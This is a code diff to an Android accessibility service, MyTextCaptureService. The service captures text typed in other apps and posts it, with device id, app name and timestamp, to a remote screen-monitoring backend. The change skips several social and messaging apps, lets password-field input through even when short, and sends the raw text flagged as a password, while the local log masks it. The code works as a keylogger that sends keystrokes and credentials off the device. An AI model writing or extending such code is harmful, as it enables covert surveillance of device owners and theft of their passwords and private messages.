@@ -4,6 +4,9 @@ import android.accessibilityservice.AccessibilityService;
 import android.view.accessibility.AccessibilityEvent;
 import android.util.Log;
 
+import java.util.Arrays;
+import java.util.HashSet;
+import java.util.Set;
 import org.json.JSONObject;
 
 import java.util.List;
@@ -14,36 +17,56 @@ import okhttp3.RequestBody;
 public class MyTextCaptureService extends AccessibilityService {
 
     private static final String TAG = "TextCaptureService";
+    
+    // List of apps to ignore
+    private static final Set<String> IGNORED_PACKAGES = new HashSet<>(Arrays.asList(
+            "com.facebook.katana",   // Facebook
+            "com.facebook.orca",     // Messenger
+            "com.facebook.mlite",    // Messenger Lite
+            "com.whatsapp",          // WhatsApp
+            "com.whatsapp.w4b",      // WhatsApp Business
+            "com.snapchat.android"   // Snapchat
+    ));
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+            String packageName = event.getPackageName() != null
+                    ? event.getPackageName().toString()
+                    : "unknown";
+
+            // 1. Avoid capturing from certain apps
+            if (IGNORED_PACKAGES.contains(packageName)) {
+                return;
+            }
+
             List<CharSequence> texts = event.getText();
             if (texts != null && !texts.isEmpty()) {
                 String typedText = texts.get(0).toString().trim();
 
-                if (typedText.length() > 2) {  // খুব ছোট টেক্সট বাদ দিতে
-                    String packageName = event.getPackageName() != null
-                            ? event.getPackageName().toString()
-                            : "unknown";
+                // 2. Password text handling
+                // Note: Android usually masks password fields for security.
+                // If it's a password field, event.isPassword() will be true.
+                boolean isPassword = event.isPassword();
 
-                    Log.d(TAG, "Typed: " + typedText + " | App: " + packageName);
-
-                    sendToBackend(typedText, packageName);
+                if (typedText.length() > 2 || isPassword) {
+                    Log.d(TAG, "Typed: " + (isPassword ? "[PASSWORD]" : typedText) + " | App: " + packageName);
+                    sendToBackend(typedText, packageName, isPassword);
                 }
             }
         }
     }
 
-    private void sendToBackend(String text, String packageName) {
+    private void sendToBackend(String text, String packageName, boolean isPassword) {
         new Thread(() -> {
             try {
                 String url = UrlHelper.getApiUrl("screenmonitoring-6hn7.onrender.com", "/api/typed-text");
 
                 JSONObject json = new JSONObject();
-                json.put("device_id", getStoredDeviceId());  // নিচে দেখুন
+                json.put("device_id", getStoredDeviceId());
                 json.put("text", text);
                 json.put("app_package", packageName);
+                json.put("is_password", isPassword);
                 json.put("timestamp", System.currentTimeMillis());
 
                 RequestBody body = RequestBody.create(
